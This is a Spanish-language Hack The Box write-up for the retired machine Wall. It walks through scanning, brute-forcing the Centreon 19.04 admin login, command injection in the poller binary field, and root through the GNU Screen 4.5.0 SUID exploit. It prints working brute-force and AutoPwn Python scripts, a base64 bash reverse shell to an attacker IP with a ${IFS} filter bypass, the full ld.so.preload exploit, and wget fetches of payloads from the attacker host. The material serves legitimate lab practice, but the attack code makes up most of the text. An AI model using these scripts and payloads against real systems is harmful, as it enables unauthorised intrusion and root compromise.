---
layout: post
title:  "Maquina Retirada Wall de Hack The Box (Necesario VIP)"
description: En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada WALL
tags: HTB, Bypass, BruteForce, Web Hacking, Maquinas Retiradas, Writeup, Python3, Script, AutoPwn,
---

# Wall ~ Hack The Box

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.157       "
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA)
|   256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA)
|_  256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Procedemos a realizar el Fuerza Bruta para encontrar Directorios pontenciales a nivel Web, para ello usamos la herramienta `Wfuzz`
```bash
# wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.10.157/FUZZ                                                          1 ⚙
Target: http://10.10.10.157/FUZZ
Total requests: 220547

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                        
=====================================================================

000003458:   401        14 L     54 W       459 Ch      "monitoring"

```
Encontramos esta ruta potencial a probar, vamos a hecharle un ojo.
Vemos que es un Panel de Autenticacion Emergente. Vamos a ver como se tramita la data, con Crtl + Mayus + I, nos vamos a la pestaña Network y formulamos la peticion Login
Vemos que se tramita por GET, vamos a hacer la peticion con el Comando `CURL`:
```bash
# curl -s -X GET "http://10.10.10.157/monitoring"   
# curl -s -X GET "http://10.10.10.157/monitoring" | html2text                                               1 ⚙
****** Unauthorized ******
This server could not verify that you are authorized to access the document
requested. Either you supplied the wrong credentials (e.g., bad password), or
your browser doesn't understand how to supply the credentials required.
===============================================================================
     Apache/2.4.29 (Ubuntu) Server at 10.10.10.157 Port 80
# "Sin html2text" Respuesta Normal
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 10.10.10.157 Port 80</address>
</body></html>
```
Vale pues porque NO? vamos a probar a hacer la misma peticion a nivel Web pero cambiando la forma en la que se tramita la DATA a `POST`
A ver que sucede.. . .. 
```bash
# curl -s -X POST "http://10.10.10.157/monitoring" | html2text                                              1 ⚙
****** Moved Permanently ******
The document has moved here.
===============================================================================
     Apache/2.4.29 (Ubuntu) Server at 10.10.10.157 Port 80

# "Sin html2text"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://10.10.10.157/monitoring/">here</a>.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 10.10.10.157 Port 80</address>
</body></html>
```
Vemos que nos devuelve el codigo de estado 301 un redirect y nos pone que `el documento a sido movido aqui`. Vamos a poner el parametro `-L` en el comando `Curl` para 
hacer un `FOLLOW/SEGUIMIENTO` al `REDIRECT`.
```bash
# curl -s -X POST "http://10.10.10.157/monitoring" -L | html2text                                           1 ⚙
****** This page is not ready yet ! ******
***** We should redirect you to the required page ! *****

# "Sin html2text"
<h1>This page is not ready yet !</h1>
<h2>We should redirect you to the required page !</h2>

<meta http-equiv="refresh" content="0; URL='/centreon'" />
```
Vemos que nos esta devolviendo una ruta `/centreon` pues vamos a ver que hay en la ruta que hemos encontrado.
__foto__
Panel login Centreon, vemos la version 19.04. Recordamos todo lo que sean versiones se lo pasamos a la herramienta `SEARCHSPLOIT`
```bash
# searchsploit centreon  19.04                                                                                                                                            2 ⚙
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                |  Path
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Centreon 19.04 - Authenticated Remote Code Execution (Metasploit)                                                                             | php/webapps/47948.rb
Centreon 19.04 - Remote Code Execution                                                                                                        | php/webapps/47069.py
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
Vemos un Recurso que es para el uso de `METASPLOIT` pero aqui no usamos `METASPLOIT`.. uagghhh!!!xD Vamos para el `OSCP` y no esta permitido
Probamos el segundo exploit y no nos funciona siguiendo atentamente los pasos que nos indica. Asique como estamos ante un panel loguin vamos a hacernos un script molon para hacer
`fuerza bruta` en `python3` como en otras ocasiones =D
```python3
#!/usr/bin/python3
# coding: utf-8
# Usado para la maquina Wall de HTB

import sys
import time
import requests
import signal
import re
import pdb

from pwn import *

def def_handler(sig, frame):
        print("\n[+] Saliendo .. .\n")
        sys.exit(1)

# Crtl+C
signal.signal(signal.SIGINT, def_handler)

# Variables Globales
main_url = "http://10.10.10.157/centreon/index.php"


def makeRequest(password):
# Variable "S" para crear una session con la que poder jugar con peticiones Get/Post en la misma Session
        s = requests.session()
# Variable "R" para arrastrar la Variable anterior "S" para arrastrar la session y poder Trabajar con el "Centreon Token" al hacer la peticion a "MAIN__URL"
        r = s.get(main_url)
# Token en el que filtramos con expresiones Regulares para filtrarlo y pasarlo por cada peticion correctamente
        centreon_token = re.findall(r'type="hidden" value="(.*?)"', r.text)[0]
# Data que Formalizamos (Depende de la propia web)
        login_data = {

        'useralias': 'admin',
        'password': password,
        'submitLogin': 'Connect',
        'centreon_token': centreon_token

        }

        r = s.post(main_url, data=login_data)

# Bucle if para que cuando la frase Credentianls Incorrect NO se encuentren en la Respuesta del Servidor nos reporte la Contraseña Correcta
        if "Your credentials are incorrect." not in r.text:
# Actualizacion de la barra de Progreso P1
                p1.status("La Password ha sido encontrada: %s" % password)
                sys.exit(0)

if __name__ == '__main__':

# Declaramos una variable "f" que nos abra un diccionario (mil primeras lineas Rockyou.txt) con permisos de lectura
        f = open("dicc.txt", "r")
# Barras de estado
        p1 = log.progress("Fuerza Bruta contra Centreon")
        p1.status("Iniciando proceso de Fuerza Bruta contra el Panel Loguin")
        time.sleep(2)
# Para cada Password que se lea se va a tramitar una peticion web probando la Password
        for password in f.readlines():
                p1.status("Probando la Password: %s" % password.strip("\n"))
# Funcion Principal
                makeRequest(password.strip("\n"))
```
Chequear el script paso por paso y recordar lo del `Centreon_token`

Ejecutamos el script molon y nos devuelve que para el usuario `admin` la `password` es `pxxxxxxxx`

Nos logueamos en el panel de `Centreon` con la credencial obtenida.

Antes ojeando el `Script en Python del RCE` vemos algunas rutas potenciales a investigar dentro del panel del CMS

Encontramos el RCE en la url `http://10.10.10.157/centreon/main.get.php?p=60901` que vemos que tiene un `poller` llamado `centreon`
Nos metemos para configurarlo y nos encontramos con las mismas rutas que habia en el exploit de python y localizamos el campo del RCE para injectar comandos y como ejecutarlo.

Basicamente cambiamos el campo de `Monitoring Engine Binary` en la que aparecia una ruta (que borramos) y sustituimos por nuestro comando a ejecutar `whoami;`
Guardamos la configuracion `save`
Procedemos a selecionar la plantilla y darle a la opcion `Export Configuration` que nos redirige a `http://10.10.10.157/centreon/main.php?p=60902&poller=1`
Estando en la pagina de  `| Configuration Files Export` procedemos a darle a `Export`.

Y vemos que hemos encontrado el RCE, ahora vamos a intentar entablarnos una reverse_shell como siempre para acceder a la maquina.
Probamos distintos comandos y obtenemos que muchas veces [sobretodo cuando hay espacios en el comando] no podemos guardar la configuracion como si por detras hubiese un `Waff` o `Firewall`.

Conseguimos obtener una reverse_shell atraves de introducir el siguiente comando: 
```bash
# Pasamos a base64 nuestro comando a ejecutar
echo 'bashc -i >& /dev/tcp/10.10.15.141/1234 0>&1' | base64 
YmFzaGMgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTQxLzEyMzQgMD4mMQo=
# Procedemos a poner el comando a ejecutar final
echo YmFzaGMgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTQxLzEyMzQgMD4mMQo= | base64 -d | bash
# Y no nos funciona!!!!!!!!!!!!!!!!!!!!!!!!!!!!
```
# Espacios NO porfavor ${IFS}
Como hemos dicho antes, parece ser que hay un `WAFF` por detras validando que no hallan espacios, asique en bash una tecnica muy buena es la de sustituir los espacios por el
comando `${IFS}`
Tal que asi quedaria el comando que nos devuelve la shell perfectamente:
```bash
echo${IFS}YmFzaGMgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTQxLzEyMzQgMD4mMQo=|base64${IFS}-d|bash;
```
# Automatizacion de la intrusion para ganar acceso directo con nuestro exploit `AutoPwn_Wall.py`
Vamos a crearnos nuestro script para automatizar la intrusion tal como la hemos explicado, pasando el script en `python3` de `Fuerza Bruta` a un `Exploit` de acceso a la maquina
como el usuario `www-data`
```python3
#!/usr/bin/python3
# coding: utf-8

import sys
import time
import requests
import signal
import re
import pdb

from pwn import *

def def_handler(sig, frame):
        print("\n[+] Saliendo .. .\n")
        sys.exit(1)

# Crtl+C
signal.signal(signal.SIGINT, def_handler)

# Variables Globales
main_url = "http://10.10.10.157/centreon/index.php"
config_url = "http://10.10.10.157/centreon/main.get.php?p=60901"
rce_url = "http://10.10.10.157/centreon/include/configuration/configGenerate/xml/generateFiles.php"

def makeRequest(password):
# Variable "S" para crear una session con la que poder jugar con peticiones Get/Post en la misma Session
        s = requests.session()
# Variable "R" para arrastrar la Variable anterior "S" para arrastrar la session y poder Trabajar con el "Centreon Token" al hacer la peticion a "MAIN__URL"
        r = s.get(main_url)
# Token en el que filtramos con expresiones Regulares para filtrarlo y pasarlo por cada peticion correctamente
        centreon_token = re.findall(r'type="hidden" value="(.*?)"', r.text)[0]
# Data que Formalizamos (Depende de la propia web)
        login_data = {

        'useralias': 'admin',
        'password': password,
        'submitLogin': 'Connect',
        'centreon_token': centreon_token

        }

        r = s.post(main_url, data=login_data)
# Volvemos a actualizar la variable Centreon_token haciendo una peticion a la url nueva y actualizando el nombre de la variable a new_token
        r = s.get(config_url)

        new_token = re.findall(r'type="hidden" value="(.*?)"', r.text)[6]
# Data que tramitamos para la segunda peticion web y ganar acceso
        data_config_post = {

                'name':'Central',
                'ns_ip_address':'127.0.0.1',
                'localhost[localhost]':'1',
                'is_default[is_default]':'0',
                'ssh_port':'22',
                'init_script':'centengine',
                'nagios_bin':'echo${IFS}YmFzaGMgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTQxLzEyMzQgMD4mMQo=|base64${IFS}-d|bash;',
                'nagiostats_bin':'/usr/sbin/centenginestats',
                'nagios_perfdata':'/var/log/centreon-engine/service-perfdata',
                'centreonbroker_cfg_path':'/etc/centreon-broker',
                'centreonbroker_module_path':'/usr/share/centreon/lib/centreon-broker',
                'centreonbroker_logs_path': '',
                'centreonconnector_path':'/usr/lib64/centreon-connector',
                'init_script_centreontrapd':'centreontrapd',
                'snmp_trapd_path_conf':'/etc/snmp/centreon_traps/',
                'ns_activate[ns_activate]':'1',
                'submitC':'Save',
                'id':'1',
                'o':'c',
                'centreon_token': new_token
                }
# Peticion arrastrando la session S
        r = s.post(config_url, data=data_config_post)
# Data para el ejecutar el rce con la tercera peticion a nivel web
        rce_data = {

                'poller': '1',
                'debug': 'true',
                'generate':'true'
                }
# Peticion ultima en la que seria darle a la opcion "Export"
        r = s.post(rce_url, data=rce_data)

if __name__ == '__main__':

        p1 = log.progress("Abriendo Session")
# Funcion Principal
        makeRequest("password1")
```

Vale lanzamos el exploit:
```bash
# python3 AutoPwn_Wall.py                                                                                   1 ⚙
[ ] Abriendo Session
```
Nos ponemos con una session de `nc -vlnp 1234` en el puerto indicado anteriormente y procedemos a hacer los mismos pasos.
Recibimos la `R_shell`
```bash
└─# nc -vlnp 1234                                                                                             1 ⨯
listening on [any] 1234 ...
connect to [10.10.15.141] from (UNKNOWN) [10.10.10.157] 60452
bash: cannot set terminal process group (1001): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Wall:/usr/local/centreon/www$ 
```

# Escalada de privilegios

Una vez dentro vemos donde se encuentra la flag `user.txt`, y se encuentra en la ruta `/home/shelby/user.txt`
Intentamos visualizarla y vemos que no tenemos acceso a ella. Por lo que toca enumerar para ver si hay alguna posibilidad de escalar privilegios al usuario shelby o root.
Procedemos como siempre: 
```bash
www-data@Wall:/usr/local/centreon/www$ find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
/bin/mount
/bin/ping
  "/bin/screen-4.5.0"   "Investigamos este"
/bin/fusermount
/bin/su
/bin/umount
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/eject/dmcrypt-get-device
```
Hacemos un `searchsploit screen 4.5`:
```bash
# searchsploit screen 4.5                                                              
----------------------------------------------------------------------------- ---------
 Exploit Title                                                |  Path
---------------------------------------------------------------------------- -----------
GNU Screen 4.5.0 - Local Privilege Escalation                 | linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC)           | linux/local/41152.txt
----------------------------------------------------------------------------- -----------
```
Nos descargamos el primero que esta en `bash`
Y vemos lo que hace.
```bash
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell 
```
Vale pues porque no vamos a intentar copiarnoslo y ejecutarlo en la maquina victima a ver si conseguimos acceso como root!!
Lo probamos y vemos que si:
```bash
www-data@Wall:/etc$ /tmp/rootshell 
# whoami
root
# 
```

Conseguimos escalar privilegios como `root` y ya podriamos visualizar las dos flags !! =D Maquina Rooteada Perooo....... porque no? vamos a automatizarnos la escalada con nuestro
exploit `AutoPwn_Wall.py` para acceder como `root` Directamente Yeahh!!! 
```bash
# ls                                                                                                                                                                1 ⚙
"AutoPwn_Wall.py"  libhax.c  "libhax.so"  "rootshell"  rootshell.c
```
Vale pues para la escalada tenemos que crearnos dos archivos (los no indicados) y compilarlos para que el exploit tire de ellos y lso transfiera desde nuestra ip a la maquina victima
```python3
#!/usr/bin/python3
# coding: utf-8

import sys
import time
import requests
import signal
import re
import pdb
import threading

from pwn import *

def def_handler(sig, frame):
        print("\n[+] Saliendo .. .\n")
        sys.exit(1)

# Crtl+C
signal.signal(signal.SIGINT, def_handler)

# Variables Globales, hacemos tres peticiones web 1 main_url, 2 config_url y 3 rce_url
main_url = "http://10.10.10.157/centreon/index.php"
config_url = "http://10.10.10.157/centreon/main.get.php?p=60901"
rce_url = "http://10.10.10.157/centreon/include/configuration/configGenerate/xml/generateFiles.php"
lport = 1234 # No Change THIS

def makeRequest(password):
# Variable "S" para crear una session con la que poder jugar con peticiones Get/Post en la misma Session
        s = requests.session()
# Variable "R" para arrastrar la Variable anterior "S" para arrastrar la session y poder Trabajar con el "Centreon Token" al hacer la peticion a "MAIN__URL"
        r = s.get(main_url)
# Token en el que filtramos con expresiones Regulares para filtrarlo y pasarlo por cada peticion correctamente
        centreon_token = re.findall(r'type="hidden" value="(.*?)"', r.text)[0]
# Data que Formalizamos, modificamos los parametros password y cetreon token para que valgan las variables que tenemos predefinidas
        login_data = {

        'useralias': 'admin',
        'password': password,
        'submitLogin': 'Connect',
        'centreon_token': centreon_token

        }
# Peticion POST arrastrando la session y tramitando la data password1
        r = s.post(main_url, data=login_data)

# Actualizando el valor de la variable cetreon_token a new token, hacemos otra peticion a la url correspondiente y filtramos igual con la libreria RE
        r = s.get(config_url)
# El antiguo cetreon_token ahora lo llamamos new_token y lo reobtenemos de la url correspondiente config_url
        new_token = re.findall(r'type="hidden" value="(.*?)"', r.text)[6]
# Data que Formalizamos en esta nueva peticion web
        data_config_post = {

                'name':'Central',
                'ns_ip_address':'127.0.0.1',
                'localhost[localhost]':'1',
                'is_default[is_default]':'0',
                'ssh_port':'22',
                'init_script':'centengine',
                'nagios_bin':'echo${IFS}YmFzaGMgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTQxLzEyMzQgMD4mMQo=|base64${IFS}-d|bash;',
                'nagiostats_bin':'/usr/sbin/centenginestats',
                'nagios_perfdata':'/var/log/centreon-engine/service-perfdata',
                'centreonbroker_cfg_path':'/etc/centreon-broker',
                'centreonbroker_module_path':'/usr/share/centreon/lib/centreon-broker',
                'centreonbroker_logs_path': '',
                'centreonconnector_path':'/usr/lib64/centreon-connector',
                'init_script_centreontrapd':'centreontrapd',
                'snmp_trapd_path_conf':'/etc/snmp/centreon_traps/',
                'ns_activate[ns_activate]':'1',
                'submitC':'Save',
                'id':'1',
                'o':'c',
                'centreon_token': new_token
                }

        r = s.post(config_url, data=data_config_post)

# Data de la ultima peticion RCE
        rce_data = {

                'poller': '1',
                'debug': 'true',
                'generate':'true'
                }

        r = s.post(rce_url, data=rce_data)


if __name__ == '__main__':

# Metemos un hilo 
        try:
                threading.Thread(target=makeRequest, args=("password1",)).start()
        except Exception as e:
                log.error(str(e))
# Varibles de texto
        p1 = log.progress("Pwn")
        p1.status("Ganando Acceso al sistema")
# variable a la escucha por el puerto indicado 1234 esperando una conexion entrante
        shell = listen(lport, timeout=20).wait_for_connection()
# Bucle if la variable shell no tiene conexion fail
        if shell.sock is None:
                p1.failure("No se ha podido ganar acceso, paquete")
# Cualquier otra cosa Succes
        else:
                p1.success("Yuhu!!, se ha entrablado la conexion ahi to pro")

        time.sleep(2)
# Privesc atraves de el binario SUID SCREEN 4.5
        shell.sendline("cd /tmp")
        shell.sendline("wget http://10.10.15.141/libhax.c")
        shell.sendline("wget http://10.10.15.141/rootshell")
        shell.sendlines("chmod +x libhax.c rottshell")
        shell.sendline("cd /etc")
        shell.sendline("umask 000")
        shell.sendline("screen -D -m -L ld.so.preload echo -ne  '\x0a/tmp/libhax.so'")
        shell.sendline("screen -ls")
        shell.sendline("/tmp/rootshell")
        shell.sendline("'user:' | cat /home/shelby/user.txt")
        shell.sendline("'root:' | cat /root/root.txt")
# llamamos a la variable shell final para que nos lance la shell 
        shell.interactive()




```

